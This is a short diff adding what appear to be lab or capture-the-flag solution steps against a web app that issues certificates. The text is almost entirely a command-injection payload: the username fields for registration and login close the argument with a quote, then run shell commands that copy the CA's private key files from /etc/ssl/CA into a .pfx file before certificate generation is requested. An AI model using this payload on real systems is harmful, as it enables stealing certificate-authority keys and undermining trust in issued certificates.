@@ -1,0 +1,4 @@
+register as : ';echo%2520hi>alice.csr;cat%2520/etc/ssl/CA/*.pem>alice.pfx'  - password: pass
+
+login as : ';echo%2520hi>alice.csr;cat%2520/etc/ssl/CA/*.pem>alice.pfx'  - password: pass
+ask to generate certificate
